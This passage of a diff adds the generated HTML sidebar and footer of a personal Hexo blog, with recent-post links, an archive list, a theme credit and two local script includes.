href="/tags/vscode/" rel="tag">vscode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-recent-posts">
+    <div class="widget-title"><span>Recent Posts</span></div>
+    <div class="widget-inner">
+      <ul>
+        
+          <li>
+            <a href="/2022/09/16/phoneTest/">给爪机上点科技</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/15/%E8%BF%9C%E6%8E%A7%E9%97%AE%E9%A2%98%E9%9B%86/">远控问题集</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/10/text021/">text021</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/10/text020/">text020</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/text019/">text019</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-archive">
+    <div class="widget-title"><span>Archive</span></div>
+    <div class="widget-inner">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li></ul>
+    </div>
+  </div>
+
+
+    
+</div>
+
+<div id="backtop"><i class="icon icon-arrow-up"></i></div>
+            </aside>
+            
+        </div>
+    </div>
+
+    <footer class="footer">
+    <div class="footer-wave">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
+    </div>
+
+    <!-- Please do not remove this -->
+    <!-- 开源不易，请勿删除 -->
+    <div class="footer-wrap">
+        <div class="footer-inner"> 
+            ohmyhsy &copy; 2022<br>
+            Powered By Hexo · Theme By <a href="https://linhong.me/" target="_blank">Aomori</a> · <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Github</a>
+        </div>
+    </div>
+
+</footer>
+
+
+
+
+
+
+<script src="/dist/build.js?1646451311888.js"></script>
+
+
+<script src="/dist/custom.js?1646451311888.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+
+</html>
